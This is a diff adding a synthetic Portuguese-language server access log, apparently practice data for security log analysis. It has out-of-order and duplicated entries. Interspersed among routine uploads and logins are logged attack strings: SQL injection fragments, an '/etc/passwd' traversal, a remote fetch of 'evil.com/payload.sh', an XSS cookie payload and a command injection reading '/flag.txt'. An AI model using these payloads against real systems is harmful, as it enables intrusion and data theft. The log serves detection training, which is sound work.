@@ -1,0 +1,69 @@
+2025-06-25 09:00:00 | IP: 192.168.10.11 | user: marcos.silva | ação: Upload arquivo: relatorio_vendas.pdf
+2025-06-25 09:00:13 | IP: 192.168.10.12 | user: carlos.junior | ação: Upload arquivo: financeiro_2024.xlsx
+2025-06-25 09:00:14 | IP: 192.168.10.10 | user: aline.costa | ação: Upload arquivo: backup.zip
+2025-06-25 09:00:09 | IP: 192.168.10.11 | user: ana.souza | ação: Login falha
+2025-06-25 09:00:04 | IP: 127.0.0.1 | user: sistema | ação: Verificação antivírus concluída
+2025-06-25 09:00:10 | IP: 198.51.100.23 | user: tiago.pereira | ação: Força bruta detectada: múltiplas falhas
+2025-06-25 09:01:12 | IP: 203.0.113.55 | user: aline.costa | ação: Upload arquivo malicioso: shell.php
+2025-06-25 09:01:52 | IP: 198.51.100.23 | user: ana.souza | ação: SQL Injection tentativa: SELECT * FROM users WHERE user='admin' --
+2025-06-25 09:02:40 | IP: 127.0.0.1 | user: sistema | ação: Verificação antivírus concluída
+2025-06-25 09:00:27 | IP: 192.168.10.11 | user: ana.souza | ação: Consulta registro
+2025-06-25 09:01:40 | IP: 192.168.10.10 | user: carlos.junior | ação: Upload arquivo: financeiro_2024.xlsx
+2025-06-25 09:02:23 | IP: 192.168.10.10 | user: tiago.pereira | ação: Upload arquivo: backup.zip
+2025-06-25 09:01:24 | IP: 192.168.10.12 | user: tiago.pereira | ação: Login sucesso
+2025-06-25 09:01:31 | IP: 192.168.10.10 | user: carlos.junior | ação: Erro de permissão
+2025-06-25 09:04:12 | IP: 192.0.2.89 | user: tiago.pereira | ação: SQL Injection tentativa: SELECT * FROM users WHERE user='admin' --
+2025-06-25 09:04:15 | IP: 127.0.0.1 | user: sistema | ação: Verificação antivírus concluída
+2025-06-25 09:03:28 | IP: 192.168.10.10 | user: aline.costa | ação: Erro de permissão
+2025-06-25 09:05:23 | IP: 192.168.10.12 | user: marcos.silva | ação: Login sucesso
+2025-06-25 09:03:18 | IP: 192.0.2.89 | user: ana.souza | ação: Força bruta detectada: múltiplas falhas
+2025-06-25 09:02:32 | IP: 127.0.0.1 | user: sistema | ação: Backup iniciado
+2025-06-25 09:04:40 | IP: 192.168.10.12 | user: marcos.silva | ação: Login sucesso
+2025-06-25 09:03:09 | IP: 192.168.10.11 | user: carlos.junior | ação: Login sucesso
+2025-06-25 09:07:20 | IP: 192.168.10.12 | user: ana.souza | ação: Erro de permissão
+2025-06-25 09:00:23 | IP: 198.51.100.23 | user: carlos.junior | ação: Upload arquivo malicioso: shell.php
+2025-06-25 09:08:00 | IP: 192.168.10.12 | user: ana.souza | ação: Upload arquivo: senha_pessoal.txt
+2025-06-25 09:06:40 | IP: 192.168.10.10 | user: marcos.silva | ação: Login falha
+2025-06-25 09:06:56 | IP: 192.168.10.10 | user: marcos.silva | ação: Login sucesso
+2025-06-25 09:00:54 | IP: 127.0.0.1 | user: sistema | ação: Atualização automática
+2025-06-25 09:01:52 | IP: 192.168.10.10 | user: ana.souza | ação: Download arquivo: relatorio_vendas.pdf
+2025-06-25 09:03:52 | IP: 192.168.10.11 | user: ana.souza | ação: Upload arquivo: backup.zip
+2025-06-25 09:00:00 | IP: 192.168.10.11 | user: marcos.silva    | ação: Upload arquivo: relatorio_vendas.pdf
+2025-06-25 09:00:05 | IP: 10.0.0.5      | user: teste                | ação: Login falha
+2025-06-25 09:00:08 | IP: 10.0.0.5      | user: admin                | ação: Login falha
+2025-06-25 09:00:10 | IP: 10.0.0.5      | user: root                 | ação: Login sucesso
+2025-06-25 09:00:13 | IP: 192.168.10.12 | user: carlos.junior        | ação: Upload arquivo: financeiro_2024.xlsx
+2025-06-25 09:00:14 | IP: 192.168.10.10 | user: aline.costa          | ação: Upload arquivo: backup.zip
+2025-06-25 09:00:15 | IP: 192.168.10.10 | user: aline.costa          | ação: Download arquivo: secrets.csv
+2025-06-25 09:00:16 | IP: 192.168.10.10 | user: aline.costa          | ação: Download arquivo: senha_db.txt
+2025-06-25 09:00:18 | IP: 192.168.10.10 | user: aline.costa          | ação: Download arquivo: tokens.json
+2025-06-25 09:00:20 | IP: 192.168.10.10 | user: aline.costa          | ação: Download arquivo: credenciais.pem
+2025-06-25 09:00:22 | IP: 192.168.10.10 | user: aline.costa          | ação: Download arquivo: data_dump.sql
+2025-06-25 09:00:25 | IP: 192.168.10.11 | user: ana.souza            | ação: Consulta registro
+2025-06-25 09:00:27 | IP: 192.168.10.11 | user: ana.souza            | ação: Login falha
+2025-06-25 09:00:29 | IP: 192.168.10.11 | user: ana.souza            | ação: Login falha
+2025-06-25 09:00:31 | IP: 192.168.10.11 | user: ana.souza            | ação: Login sucesso
+2025-06-25 09:00:35 | IP: 203.0.113.55  | user: aline.costa          | ação: Upload arquivo malicioso: shell.php
+2025-06-25 09:00:40 | IP: 203.0.113.55  | user: aline.costa          | ação: SQL Injection tentativa: SELECT password FROM users--
+2025-06-25 09:01:00 | IP: 198.51.100.23 | user: tiago.pereira        | ação: Força bruta detectada: múltiplas falhas
+2025-06-25 09:01:12 | IP: 198.51.100.23 | user: ana.souza            | ação: SQL Injection tentativa: SELECT * FROM users WHERE 1=1--
+2025-06-25 09:01:30 | IP: 192.0.2.89    | user: ana.souza            | ação: Força bruta detectada: múltiplas falhas
+2025-06-25 09:01:45 | IP: 192.0.2.89    | user: ana.souza            | ação: Login sucesso
+2025-06-25 09:02:00 | IP: 203.0.113.55  | user: carlos.junior        | ação: Inclusão remota de arquivo: ../../etc/passwd     # LFI
+2025-06-25 09:02:10 | IP: 203.0.113.55  | user: carlos.junior        | ação: Fetch remoto via URL: http://evil.com/payload.sh # RFI
+2025-06-25 09:02:20 | IP: 203.0.113.55  | user: carlos.junior        | ação: Payload XSS: <script>alert(document.cookie)</script>
+2025-06-25 09:02:30 | IP: 203.0.113.55  | user: carlos.junior        | ação: Comando injetado: ls; cat /flag.txt; whoami
+2025-06-25 09:02:40 | IP: 127.0.0.1     | user: sistema              | ação: Verificação antivírus concluída
+2025-06-25 09:02:50 | IP: 127.0.0.1     | user: sistema              | ação: Backup iniciado
+2025-06-25 09:03:00 | IP: 127.0.0.1     | user: sistema              | ação: Atualização automática
+2025-06-25 09:03:15 | IP: 192.168.10.12 | user: marcos.silva         | ação: Login sucesso
+2025-06-25 09:03:25 | IP: 192.168.10.12 | user: marcos.silva         | ação: Erro de permissão
+2025-06-25 09:03:35 | IP: 192.168.10.12 | user: ana.souza            | ação: Upload arquivo: senha_pessoal.txt
+2025-06-25 09:03:45 | IP: 192.168.10.10 | user: carlos.junior        | ação: Download arquivo: relatório_final.docx
+2025-06-25 09:03:55 | IP: 192.168.10.11 | user: carlos.junior        | ação: Login sucesso
+2025-06-25 09:04:05 | IP: 10.0.0.5      | user: guest                | ação: Login falha
+2025-06-25 09:04:07 | IP: 10.0.0.5      | user: guest                | ação: Login falha
+2025-06-25 09:04:09 | IP: 10.0.0.5      | user: guest                | ação: Login falha
+2025-06-25 09:04:11 | IP: 10.0.0.5      | user: guest                | ação: Login falha
+2025-06-25 09:04:13 | IP: 10.0.0.5      | user: guest                | ação: Login falha
+2025-06-25 09:04:15 | IP: 10.0.0.5      | user: guest                | ação: Login sucesso
